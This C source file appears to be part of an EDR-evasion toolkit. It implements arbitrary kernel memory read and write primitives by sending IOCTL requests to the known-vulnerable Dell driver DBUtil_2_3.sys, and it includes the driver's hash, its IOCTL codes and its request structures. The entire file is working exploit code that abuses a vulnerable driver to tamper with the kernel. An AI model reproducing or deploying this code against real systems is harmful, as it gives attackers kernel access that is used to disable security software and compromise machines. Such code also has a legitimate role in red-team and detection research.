#include <windows.h>
#include <assert.h>
#include <tchar.h>

#include "../EDRSandblast.h"

/*
* "DBUtil_2_3.sys" (SHA256: 0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5)
*/

struct DBUTIL23_MEMORY_READ {
    DWORD64 field0;
    DWORD64 Address;
    DWORD Offset;
    DWORD field14;
    BYTE Buffer[1];
};

struct DBUTIL23_MEMORY_WRITE {
    DWORD64 field0;
    DWORD64 Address;
    DWORD Offset;
    DWORD field14;
    BYTE Buffer[1];
};

static const DWORD DBUTIL23_MEMORY_READ_CODE = 0x9B0C1EC4;
static const DWORD DBUTIL23_MEMORY_WRITE_CODE = 0x9B0C1EC8;

static_assert(offsetof(struct DBUTIL23_MEMORY_READ, Buffer) == 0x18, "sizeof DBUTIL23_MEMORY_READ must be 0x18 bytes");
static_assert(offsetof(struct DBUTIL23_MEMORY_WRITE, Buffer) == 0x18, "sizeof DBUTIL23_MEMORY_WRITE must be 0x18 bytes");

HANDLE g_Device_DBUtil = INVALID_HANDLE_VALUE;
HANDLE GetDriverHandle_DBUtil() {
    if (g_Device_DBUtil == INVALID_HANDLE_VALUE) {
        TCHAR service[] = TEXT("\\\\.\\DBUtil_2_3");
        HANDLE Device = CreateFile(service, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

        if (Device == INVALID_HANDLE_VALUE) {
            _tprintf_or_not(TEXT("[!] Unable to obtain a handle to the vulnerable driver, exiting...\n"));
            exit(EXIT_FAILURE);
        }
        g_Device_DBUtil = Device;
    }

    return g_Device_DBUtil;
}

VOID CloseDriverHandle_DBUtil() {
    CloseHandle(g_Device_DBUtil);
    g_Device_DBUtil = INVALID_HANDLE_VALUE;
}



VOID ReadMemoryPrimitive_DBUtil(SIZE_T Size, DWORD64 Address, PVOID Buffer) {
    struct DBUTIL23_MEMORY_READ* ReadCommand = calloc(1, Size + sizeof(struct DBUTIL23_MEMORY_READ));
    if (!ReadCommand) {
        _putts_or_not(TEXT("Allocation failed, aborting...\n"));
        exit(1);
    }
    ReadCommand->Address = Address;
    ReadCommand->Offset = 0;
    
    DWORD BytesReturned;

    if (Address < 0x0000800000000000) {
        _tprintf_or_not(TEXT("Userland address used: 0x%016llx\nThis should not happen, aborting...\n"), Address);
        exit(1);
    }
    if (Address < 0xFFFF800000000000) {
        _tprintf_or_not(TEXT("Non canonical address used: 0x%016llx\nAborting to avoid a BSOD...\n"), Address);
        exit(1);
    }

    DeviceIoControl(GetDriverHandle_DBUtil(),
        DBUTIL23_MEMORY_READ_CODE,
        ReadCommand,
        offsetof(struct DBUTIL23_MEMORY_READ, Buffer) + (DWORD)Size,
        ReadCommand,
        offsetof(struct DBUTIL23_MEMORY_READ, Buffer) + (DWORD)Size,
        &BytesReturned,
        NULL);
    memcpy(Buffer, ReadCommand->Buffer, Size);
}


VOID WriteMemoryPrimitive_DBUtil(SIZE_T Size, DWORD64 Address, PVOID Buffer) {
    struct DBUTIL23_MEMORY_WRITE* WriteCommand = calloc(1, Size + sizeof(struct DBUTIL23_MEMORY_WRITE));
    if (!WriteCommand) {
        _putts_or_not(TEXT("Allocation failed, aborting...\n"));
        exit(1);
    }
    WriteCommand->Address = Address;
    WriteCommand->Offset = 0;

    DWORD BytesReturned;

    if (Address < 0x0000800000000000) {
        _tprintf_or_not(TEXT("Userland address used: 0x%016llx\nThis should not happen, aborting...\n"), Address);
        exit(1);
    }
    if (Address < 0xFFFF800000000000) {
        _tprintf_or_not(TEXT("Non canonical address used: 0x%016llx\nAborting to avoid a BSOD...\n"), Address);
        exit(1);
    }

    memcpy(WriteCommand->Buffer, Buffer, Size);
    DeviceIoControl(GetDriverHandle_DBUtil(),
        DBUTIL23_MEMORY_WRITE_CODE,
        WriteCommand,
        offsetof(struct DBUTIL23_MEMORY_WRITE, Buffer) + (DWORD)Size,
        WriteCommand,
        offsetof(struct DBUTIL23_MEMORY_WRITE, Buffer) + (DWORD)Size,
        &BytesReturned,
        NULL);
}

